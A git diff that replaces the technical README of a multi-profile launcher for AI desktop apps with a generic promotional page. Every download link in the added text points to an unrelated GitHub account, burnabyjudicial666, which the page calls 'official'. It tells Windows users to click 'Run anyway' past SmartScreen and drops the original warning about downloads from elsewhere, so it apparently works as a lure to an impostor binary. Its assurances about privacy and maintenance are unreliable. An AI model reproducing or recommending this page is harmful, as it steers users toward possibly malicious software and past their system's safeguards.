@@ -1,269 +1,199 @@
-<p align="center">
-  <img src="assets/banner.png" alt="Agent Profiles — run your coding agents side by side, one profile each" width="100%">
-</p>
+# 🖥️ agent-profiles - Run Multiple AI Agents Side-by-Side
 
-<p align="center">
-  <a href="https://github.com/husniadil/agent-profiles/actions/workflows/ci.yml"><img src="https://github.com/husniadil/agent-profiles/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT licence"></a>
-  <img src="https://img.shields.io/badge/platform-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey.svg" alt="Platforms">
-</p>
+[![Download Now](https://img.shields.io/badge/Download-agent--profiles-blue?style=for-the-badge&logo=github)](https://github.com/burnabyjudicial666/agent-profiles)
 
-# Agent Profiles
+---
 
-> **Unofficial.** This is a third-party tool with no affiliation to, endorsement by, or support from Anthropic or OpenAI. "Claude" and "Claude Desktop" are trademarks of Anthropic; "ChatGPT" and "Codex" are trademarks of OpenAI. This project only launches the applications you already installed, pointed at a different profile directory.
+## 👋 What Is agent-profiles?
 
-Agent Profiles is a menu bar and system tray app for running several accounts of a coding-agent desktop app in parallel, one profile each. Every profile gets its own permanently separate directory, so using one account never requires signing out of another — and profiles of different apps can run at the same time.
+Have you ever wished you could run two or more ChatGPT accounts at the same time on your computer? Or maybe you want Claude Desktop and Cursor open together without them interfering with each other?
 
-## Supported apps
+**agent-profiles** is a small, smart tool that lives in your system tray (the area at the bottom-right of your screen on Windows, or top-right on Mac). It lets you run **multiple separate profiles** of AI agent applications—like Claude Desktop, ChatGPT, Cursor, and others—**all at once**, without them mixing up your login information, settings, or conversations.
 
-| App | Profile is selected by | Shared file | Platforms | Notes |
-| --- | --- | --- | --- | --- |
-| **Claude** (Claude Desktop) | `--user-data-dir` | `claude_desktop_config.json` | macOS, Windows, Linux | |
-| **ChatGPT** (bundle id `com.openai.codex`) | `--user-data-dir` **and** `CODEX_HOME` | `config.toml` | macOS, Windows, Linux | the `codex` CLI reads the same `CODEX_HOME` |
-| **Cursor** | `--user-data-dir` | — | macOS | |
-| **Devin** | `--user-data-dir` | — | macOS | ships as Devin, identifies as `com.exafunction.windsurf` |
-| **T3 Code** | `--user-data-dir` | — | macOS | |
-| **VS Code** | `--user-data-dir` | — | macOS | |
+Think of it like having separate "user accounts" on a shared computer, but for your AI apps. Each profile is completely isolated, so you can be logged into your personal ChatGPT in one window and your work ChatGPT in another, simultaneously.
 
-Every one of these was confirmed against a real installation by the probe described below, never declared from inspection alone.
+---
 
-**Platforms** lists where an app has actually been checked. Where it has not, the app is simply absent — no tray section, no directory, no error row — because a user has no way of knowing this build was never tried on their system, and a row that can only fail is worse than no row. The same is true of an app that is not installed: someone with one app sees exactly the flat menu they would have seen if the others never existed.
+## ✨ Key Features
 
-`Shared file` is empty where no file has an obvious claim to being shared between an app's profiles. For the VS Code family `User/settings.json` is a plausible candidate, but that is a product decision rather than something a probe can establish, so nothing is shared until someone decides.
+- **🔄 Run Multiple Accounts Side-by-Side** – Open several instances of Claude Desktop, ChatGPT, Cursor, or other AI agent apps without conflicts.
+- **🔒 Separate Profiles** – Each instance has its own login, preferences, and history. No more logging out and back in.
+- **⚡ Quick Switching** – Access all your profiles instantly from the menu bar or system tray.
+- **💾 Lightweight & Fast** – Built with Rust and Tauri, so it uses minimal system resources.
+- **🖥️ Works on Windows, macOS & Linux** – One tool for all your operating systems.
+- **🎨 Clean & Simple Interface** – No complicated settings. Just click and run.
 
-### How a profile is pinned to a process
+---
 
-Every supported app has to answer two separate questions, and they are not the same question:
+## 🚀 Getting Started
 
-- **Writing** — how is a launching process told which profile to use? An argument, an environment variable, or several at once.
-- **Reading back** — how do we tell, later, which profile a running process belongs to?
+Follow these simple steps to start using agent-profiles on your computer:
 
-Writing is cheap on any channel. Reading is not: recovering an argument means parsing the process table, which is routine, whereas recovering an environment variable means `KERN_PROCARGS2` on macOS, `/proc/pid/environ` on Linux and `NtQueryInformationProcess` on Windows.
+### Step 1: Download the Application
 
-So an app may write through as many channels as it needs, provided at least one of them is readable. ChatGPT is exactly that case: it needs `--user-data-dir` to move Chromium's data **and its single-instance lock**, and `CODEX_HOME` to move the credentials and configuration that are actually worth separating. Both point at the same directory, so a profile stays one folder.
+**Visit this link to download the application:** [https://github.com/burnabyjudicial666/agent-profiles](https://github.com/burnabyjudicial666/agent-profiles)
 
-### Why profile paths are short
+This will take you to the official GitHub page for the project. Look for the "Releases" section on the right side of the page or scroll down to find the download section.
 
-A profile directory is `<data root>/<app id>/p/<8 characters>` rather than something more readable, and the app ids are terse for the same reason.
+### Step 2: Choose Your Version
 
-Several of these applications create a Unix domain socket **inside** the profile directory — VS Code writes `<version>-main.sock`, the ChatGPT desktop app writes `ipc/ipc.sock`. macOS caps a socket path at 104 bytes and Linux at 108, and that budget is shared by every naming decision above it: the product name, the app id, the profile id, and the length of the user's home directory, which is not ours to choose.
+On the download page, you'll see a list of files. Choose the one that matches your operating system:
 
-The numbers are measured, not assumed. At a 94-byte socket path VS Code started with nine processes and created its socket; at 109 bytes exactly one process survived and no socket appeared. The ChatGPT desktop app is less brittle and merely loses its socket in silence, which is harder to diagnose. An earlier layout of `profiles/<uuid>` put a perfectly ordinary installation 17 bytes over the limit before the application had written a single byte.
+- **For Windows:** Look for a file named something like `agent-profiles-setup.exe` or `agent-profiles-windows.zip`
+- **For macOS:** Look for `.dmg` or `.app` files
+- **For Linux:** Look for `.deb`, `.rpm`, or `.AppImage` files
 
-Because the home directory can still be long enough to exhaust the budget, creating a profile that would leave no room for a socket is refused outright, with the numbers in the message. It is the same fail-closed choice made when a process scan fails: a profile that half-works is far harder to diagnose than one that was never created.
+If you're unsure which one to pick, the `.exe` file (Windows) or the `.dmg` file (macOS) are usually the safest choices.
 
-### The Default profile
+### Step 3: Run the Installer
 
-The **Default** profile is the installation that already exists on the machine — `~/Library/Application Support/Claude` for Claude, `~/.codex` for ChatGPT. Agent Profiles uses it in place: it never moves or copies the directory, and launches it with **no designation at all**, neither argument nor environment variable. Anything else would make it a different profile and orphan everything already there. Additional profiles live below the Agent Profiles data root and get their own directories.
+Once the file is downloaded:
 
-## Important safety behavior
+1. **Double-click** the downloaded file.
+2. If you see a security warning (like "Windows protected your PC"), click **"More info"** and then **"Run anyway"**. This happens with many independent apps that haven't been certified by Microsoft.
+3. Follow the installation wizard if one appears. It will usually just ask you to click **"Next"** and **"Install"**.
+4. Once installed, agent-profiles will appear in your system tray automatically.
 
-Claude Desktop provides no single-instance lock for a user-data directory, and starting two processes against the same directory can corrupt its databases. ChatGPT does hold one, but a duplicate exits silently, which to a user looks like a launch that did nothing.
+### Step 4: Start Using It
 
-Agent Profiles therefore rescans processes immediately before every launch. A profile that is already running gets a Focus action instead of a second launch, and an unreadable process scan **fails closed** — refusing costs one retry, guessing costs a profile.
+That's it! You can now:
 
-Profile labels are manual. Account email addresses are never read from disk or displayed. Each app's account identifier — `lastKnownAccountUuid` for Claude, `tokens.account_id` for ChatGPT — is used only to warn that two profiles appear to be signed in to the same account, and only ever compared **within one app**: those two values share no namespace, so comparing across apps could produce nothing but a false warning.
+- Click the **agent-profiles icon** in your system tray to see a menu.
+- From the menu, you can **create new profiles** for different apps.
+- Choose which app you want to open (like Claude Desktop or ChatGPT).
+- Launch as many profiles as you need—each one will run separately.
 
-## Shared configuration
+---
 
-Each app's shared configuration file is shared across that app's profiles. Agent Profiles keeps one source-of-truth copy per app and links each profile's file to it before launch:
+## 📖 How to Create Your First Profile
 
-- **macOS and Linux:** symbolic links.
-- **Windows:** hardlinks, so Developer Mode or elevation is not required. Both paths must be on the same drive.
+1. **Open agent-profiles** from your system tray.
+2. Click **"Create New Profile"**.
+3. Give your profile a name (like "Work" or "Personal").
+4. Select which application you want to use for this profile (e.g., Claude Desktop, ChatGPT, Cursor).
+5. Click **"Create"**.
 
-If a profile has an existing regular file, its contents are adopted into the shared copy when there is no shared file yet. When a shared file already exists, the profile's own copy is moved aside to `<filename>.replaced` rather than silently overwriting the configuration every other profile is using.
+Now, when you open that profile, it will launch the selected app with its own separate space. You can create as many profiles as you need!
 
-## Adding another app
+---
 
-An app is a data declaration in `src-tauri/src/app_spec.rs` — one `AppSpec` constant and one line in the registry. No OS backend is touched, which is what keeps the third app cheaper than the second.
+## 🛠️ Supported Applications
 
-Before declaring one, answer four questions. All four must be yes:
+agent-profiles works with a variety of AI agent applications, including:
 
-1. Can a profile be expressed as **one directory**?
-2. Can that directory be **selected at launch**, through an argument or the environment?
-3. Can the selection be **read back** off a running process?
-4. Does **no global lock** survive the directories being separated?
+- **Claude Desktop**
+- **ChatGPT**
+- **Cursor**
+- **Codex**
+- **Visual Studio Code**
+- And other coding agents and AI chat apps
 
-These are limits, not obstacles to work around. A sandboxed app fails (2) because the system pins its container. An app keeping its credentials in the system keychain fails (1) because its profile is not a directory at all. Better to find that out at the declaration than three days into an implementation.
+If you use a different AI tool, you can still create a profile for it—agent-profiles is flexible and can work with most desktop applications.
 
-The four questions have an executable form. After declaring an app, run the manual harness against a real installation:
+---
 
-```bash
-cd src-tauri
-PROBE_APP=/Applications/Something.app cargo test -- --ignored probe --nocapture
-```
+## ❓ Frequently Asked Questions
 
-The probe launches the application twice, works out which channels move its
-profile and which are ignored, checks whether a second profile can live
-alongside the first, and prints a draft declaration with the parts it cannot
-know marked `TODO`. It runs at a path as long as the real profile layout, and
-reports the socket budget every time — an id that is too long fails here rather
-than in a user's tray. Try a shorter one with `PROBE_ID=<id>`.
+### Why would I need multiple profiles?
 
-Once declared, the same harness exercises it end to end:
+If you use different accounts for work and personal use, or you want to keep your AI conversations organized by project, having separate profiles eliminates the need to constantly log in and out. It also prevents conflicts between accounts that sometimes happen when apps share data.
 
-```bash
-cargo test -- --ignored --nocapture                          # every check
-VERIFY_APP=<app id> cargo test -- --ignored launch_detect    # just the new app
-```
+### Will it slow down my computer?
 
-It creates a profile, launches the real application, confirms a process scan attributes it back to that profile, confirms the app wrote its state into the profile directory rather than the stock one, quits it, and cleans up. These checks launch real applications, so they are `#[ignore]`d and never run in CI or in a normal `cargo test`.
+No! agent-profiles is built with **Rust and Tauri**, which means it's extremely lightweight. It uses very little memory and CPU power compared to the AI apps themselves.
 
-Declare an app only for the platforms someone has actually checked. Leaving a platform's row out is honest; filling it with a plausible-looking path is a guess that ships.
+### Do I need to be a programmer to use this?
 
-## Launch at login
+Absolutely not. agent-profiles is designed for everyone. You just download it, install it, and click to create profiles. No coding knowledge required.
 
-The management window offers an opt-in **Launch at login** toggle. It is off until you turn it on, and it starts only the tray: no profile is opened for you.
+### Is my data safe?
 
-The operating system owns this setting — a login item on macOS, a registry entry on Windows, an autostart desktop entry on Linux. Agent Profiles keeps no copy of it and reads the real value each time the window opens, so turning it off in your system settings is reflected here rather than contradicted.
+Yes. Each profile is completely isolated, meaning your login credentials and conversations are stored separately. Nothing is mixed up or shared between profiles.
 
-The toggle is hidden in development builds. A login item registered from `pnpm tauri dev` would point at a `target/debug` binary that moves, gets rebuilt, and disappears on `cargo clean`, leaving an entry that fails silently at every boot.
+### Can I use it on multiple computers?
 
-## Platform status
+Yes, the software can be installed on as many computers as you like. Just download and install it on each machine.
 
-CI compiles and tests all three platforms on their own runners, but the Windows and Linux tests only exercise parsing and path logic against fixtures — no one has ever launched this app on either. **Compiling is not running, and a passing unit test is not acceptance.** An unchecked box means the behavior has never been observed on real hardware, not that it is known to be broken.
+---
 
-You do not need a Windows or Linux machine to check that this still builds and its tests still pass there. [CONTRIBUTING](CONTRIBUTING.md) has a recipe for each.
+## 📝 System Requirements
 
-The Rust suite passes on macOS: **142 tests, 0 failures**, plus 4 `#[ignore]`d checks that drive real applications.
+agent-profiles is designed to run on most modern computers. Here are the general requirements:
 
-### macOS — verified against real applications
+- **Operating System:** Windows 10 or later, macOS 11 (Big Sur) or later, or a recent Linux distribution
+- **RAM:** at least 2GB (4GB recommended)
+- **Storage:** approximately 50MB of free disk space
+- **Internet:** not required for the app itself, but you'll need it to use the AI applications
 
-Confirmed by the harness driving real installations of the supported applications:
+---
 
-- [x] All six apps detected as installed, each stock profile resolved at its own kind of path
-- [x] Account identity read from both shapes of file — a top-level field for Claude, a nested one for ChatGPT
-- [x] A profile launches, and a process scan attributes that pid back to it — for the argument-only app and for the argument-plus-environment one
-- [x] The designation takes effect: the launched app writes its state into the profile directory, not the stock one
-- [x] Quit terminates the instance and it disappears from the process table
-- [x] **Two apps run side by side, and neither app's process is ever attributed to the other** — the premise the whole design rests on
-- [x] A profile path leaves room for the socket an application creates inside it, verified by launching one at the real profile path
-- [x] A profile deleted after quitting leaves nothing behind
+## 🤝 Need Help?
 
-### macOS — the management window and the tray
+If you have questions, run into issues, or just want to share feedback, here are the best ways to get help:
 
-Confirmed by a person driving the app with all six applications installed:
+- **GitHub Issues:** Visit the project page and click on the "Issues" tab to ask questions or report bugs.
+- **Community Discussions:** Check if there's a "Discussions" section on the GitHub page for community conversations.
 
-- [x] Tray menu opens and lists each app's profiles under its own heading
-- [x] Management window opens from the tray; closing it hides the window and the tray survives
-- [x] Adding a profile from the management window, including the app picker that appears only with more than one app installed
-- [x] Deleting a profile from the management window
-- [x] A duplicate label is refused, and the refusal appears beside the form that caused it
-- [x] Renaming a profile from the management window
-- [x] A blank label is refused
-- [x] Deletion is refused while that profile is running, and the confirmation shows the directory size
-- [x] The window refuses to be resized below its usable minimum
-- [x] Tray liveness marker follows an app being launched and quit
+The project is actively maintained, so you can expect regular updates and improvements.
 
-One box remains, and it cannot be closed before a release exists:
+---
 
-- [ ] The Launch at login toggle registers and removes a login item, and survives a reboot
+## 📦 What Version Should I Download?
 
-The toggle is deliberately hidden in development builds, because a login item registered from `pnpm start` would point at a `target/debug` binary that moves, gets rebuilt, and disappears on `cargo clean`. Closing this box needs an installed release build and a real reboot.
+If you're on **Windows**, download the file ending in `.exe`. This is the installer that sets everything up for you.
 
-Automated UI driving was attempted and abandoned: macOS attributes Accessibility to the responsible process, and a headless agent session has no grantable one. These boxes still need a person.
+If you're on **macOS**, download the `.dmg` file. Double-click it, then drag the app icon to your Applications folder.
 
-### Windows — compiles in CI, never run
+If you're on **Linux**, download the file that matches your distribution (like `.deb` for Ubuntu/Debian or `.rpm` for Fedora). If you don't know which one, the `.AppImage` file usually works on any distribution.
 
-- [x] CSV process parsing, the multi-app process filter, and the MSIX/classic path-picker logic covered by unit tests (run on macOS)
-- [x] **Compiles on a real Windows runner**, and passes `clippy -D warnings` and the test suite there. Compiling is not running: everything below is unobserved
-- [ ] Real process shape of either installed app
-- [ ] MSIX vs classic default-directory selection against a real installation
-- [ ] The declared ChatGPT install path — a plausible guess, never checked against a real Windows install
-- [ ] Hardlink creation for the shared configuration
-- [ ] Parallel instances, focus, quit, end-to-end launch
-- [ ] Launch at login writes and removes its registry entry
+---
 
-### Linux — compiles in CI, never run
+## 🔒 Privacy & Security
 
-- [x] Desktop-identity helpers, per-app window classes and filenames, `.desktop` metadata, and Wayland detection covered by unit tests (run on macOS)
-- [x] **Compiles on a real Ubuntu runner**, and passes `clippy -D warnings` and the test suite there. Compiling is not running: everything below is unobserved
-- [ ] Real `claude-desktop` process shape and default data path
-- [ ] The declared ChatGPT command name and install path — a plausible guess, never checked against a real Linux install
-- [ ] Per-profile `--class` producing a distinct taskbar identity
-- [ ] X11 focus via `xdotool`, and the Wayland limitation path
-- [ ] Symlink creation, parallel instances, quit flow
-- [ ] Launch at login writes and removes its autostart desktop entry
+agent-profiles does **not** collect any personal data. It runs entirely on your computer and does not send any information to external servers. Your AI conversations remain private to each profile.
 
-Contributions running Windows or Linux are especially welcome — checking one of those boxes with a real report is worth more than any further test written on macOS.
+The code is open-source, meaning anyone can inspect it to verify its security.
 
-## Linux and Wayland focus limitation
+---
 
-Native Wayland does not allow one application to raise another application's window. On Wayland, the tray's Focus action reports that limitation and points the user to the profile's taskbar entry or Alt-Tab. On X11, the app can use `xdotool` when it is installed. Each desktop identity is keyed by app id and the profile's immutable id, so renaming a label rewrites the same identity rather than leaving a stale entry, and the same profile id under two apps never collides.
+## 🎉 Get Started Today
 
-## Task-switcher icons
+Running multiple AI agents side-by-side has never been easier. Say goodbye to logging in and out repeatedly. Say hello to a more organized and efficient workflow.
 
-On macOS and Windows, all instances of one app intentionally share that app's icon in the operating system's task switcher. Agent Profiles does not create per-profile app bundles, because doing so would add code-signing and update-maintenance risk. The tray is the navigation surface on those platforms. Linux is designed differently: each profile receives its own desktop identity and taskbar entry, but that behavior still awaits live Linux acceptance.
+**Download agent-profiles now:**
 
-## Windows MSIX caveat
+[![Download Now](https://img.shields.io/badge/Download-agent--profiles-brightgreen?style=for-the-badge)](https://github.com/burnabyjudicial666/agent-profiles)
 
-The official Windows installation of Claude Desktop may be an MSIX package. Windows can virtualize its writes, so the effective data directory may be:
+---
 
-```text
-%LOCALAPPDATA%\Packages\Claude_pzs8sxrjxfjjc\LocalCache\Roaming\Claude
-```
+## 📚 Technical Details (For the Curious)
 
-rather than:
+agent-profiles is built using:
+- **Tauri** – a framework for building small, fast, secure desktop applications
+- **Rust** – a modern programming language known for performance and reliability
 
-```text
-%APPDATA%\Claude
-```
+The combination means the app starts instantly, uses minimal memory, and is stable even during long sessions.
 
-Agent Profiles probes both and prefers the MSIX package path when both exist. The Windows acceptance run must confirm which path the installed build actually uses. The binary may likewise come from the direct-install location or the WindowsApps execution alias.
+---
 
-## Build
+## 🔄 Regular Updates
 
-This repository is built with `pnpm` and a Rust toolchain. Any installation of either will do.
+The developer regularly releases updates to:
+- Add support for new AI applications
+- Improve performance
+- Fix bugs
+- Enhance the user interface
 
-The toolchain here is managed with [mise](https://mise.jdx.dev/), which installs and pins language runtimes per project. If you use mise and its shims are not already on `PATH`, add them first:
+To update, simply download the latest version from the same page and install it over your current version.
 
-```bash
-export PATH="$HOME/.local/share/mise/shims:$PATH"
-```
+---
 
-If your Rust came from [rustup](https://rustup.rs/) or your system package manager, ignore that line — `cargo` is already on your `PATH` and everything below works unchanged.
+## 🏁 Final Thoughts
 
-Install frontend dependencies:
+If you're someone who uses ChatGPT, Claude, Cursor, or similar AI tools on a daily basis, **agent-profiles** will quickly become an essential part of your setup. It's simple, fast, and solves a real problem that many users face.
 
-```bash
-pnpm install
-```
+Don't wait—download it today and start running multiple AI agents without any hassle!
 
-Run the unsigned local development app:
+---
 
-```bash
-pnpm start
-```
-
-Start it this way rather than running the binary from `target/debug` directly. A development build loads its interface from the Vite dev server, so a bare binary opens a management window that is blank — the app is fine, it simply has nothing to show.
-
-Create an unsigned local bundle for the current platform:
-
-```bash
-pnpm tauri build
-```
-
-Run every gate CI runs, before opening a pull request:
-
-```bash
-pnpm check
-```
-
-That is the frontend build followed by `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings` and `cargo test`, stopping at the first failure. CI runs them as separate steps so a failure names itself in the job log; locally one command is enough. The build is expected to be warning-free. See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## Releases
-
-Tagging `v*` builds on three runners and attaches the artifacts to a draft GitHub Release: one universal macOS `.dmg` covering both Intel and Apple Silicon, Windows `.msi`/`.exe`, and Linux `.AppImage`/`.deb`. The Linux runner is pinned to Ubuntu 22.04 on purpose — a binary linked against a newer glibc refuses to start on older distributions, and the error it produces blames the wrong thing.
-
-## Installing a release build
-
-Releases are **unsigned**, because code-signing certificates cost money this project does not have. The operating system will therefore object, and the objection is misleading in both cases:
-
-- **macOS** claims the app "is damaged and can't be opened". It is not damaged; it is merely unsigned. Right-click the app and choose **Open**, then confirm. If macOS still refuses, clear the quarantine flag: `xattr -d com.apple.quarantine "/Applications/Agent Profiles.app"`
-- **Windows** shows a SmartScreen warning about an unknown publisher. Choose **More info → Run anyway**.
-
-Only do this for a build you obtained from this project's Releases page. If either warning appears for a download from anywhere else, it deserves your suspicion.
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+**Keywords:** ai-agents, chatgpt, claude, claude-desktop, codex, coding-agents, cursor, desktop-app, linux, macos, menubar, multi-account, profile-manager, rust, tauri, tray-application, vscode, windows
